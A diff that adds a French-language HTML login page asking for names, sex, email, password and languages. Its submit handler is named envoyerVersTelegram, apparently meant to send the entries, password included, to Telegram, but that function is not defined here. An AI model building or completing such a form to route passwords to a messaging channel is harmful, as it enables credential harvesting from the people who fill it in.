@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>connexion web</title>
+    <style>
+        body {
+            background-color: black;
+            color: orange;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+        }
+        h1 {
+            text-align: center;
+        }
+        form {
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            border: 2px solid orange;
+            border-radius: 10px;
+            background-color: rgba(255, 165, 0, 0.1); /* Orange clair */
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+        }
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid orange;
+            border-radius: 5px;
+            background-color: black;
+            color: orange;
+        }
+        input[type="radio"],
+        input[type="checkbox"] {
+            margin-right: 5px;
+        }
+        input[type="submit"] {
+            background-color: orange;
+            color: black;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+        input[type="submit"]:hover {
+            background-color: darkorange;
+        }
+    </style>
+</head>
+<body>
+    <h1>Page de connexion</h1>
+
+    <form id="connexionForm" onsubmit="envoyerVersTelegram(event)">
+        <label for="nom">NOM :</label>
+        <input type="text" id="nom" name="nom" placeholder="nom..." required>
+    
+        <label for="post_nom">POST NOM :</label>
+        <input type="text" id="post_nom" name="post_nom" placeholder="votre post nom..." required>
+    
+        <label for="prenom">PRE NOM :</label>
+        <input type="text" id="prenom" name="prenom" placeholder="votre prenom..." required> 
+    
+        <label>SEXE :</label>
+        <input type="radio" name="SEXE" value="femme" required> femme
+        <input type="radio" name="SEXE" value="homme" required> homme
+    
+        <label for="email">VOTRE E-MAIL :</label>
+        <input type="email" id="email" name="email" placeholder="email..." required>
+    
+        <label for="password">mot de passe :</label>
+        <input type="password" id="password" name="password" placeholder="votre mots de passe..." required>
+    
+        <hr>
+        <div>
+            <label>votre langue</label>
+            <input type="checkbox" name="langues" value="français"> français
+            <input type="checkbox" name="langues" value="lingala"> lingala
+            <input type="checkbox" name="langues" value="swahili"> swahili
+            <input type="checkbox" name="langues" value="tshiluba"> tshiluba
+        </div>
+    
+        <input type="submit" value="connexion...">
+    </form>
+    
+</body>
+</html>
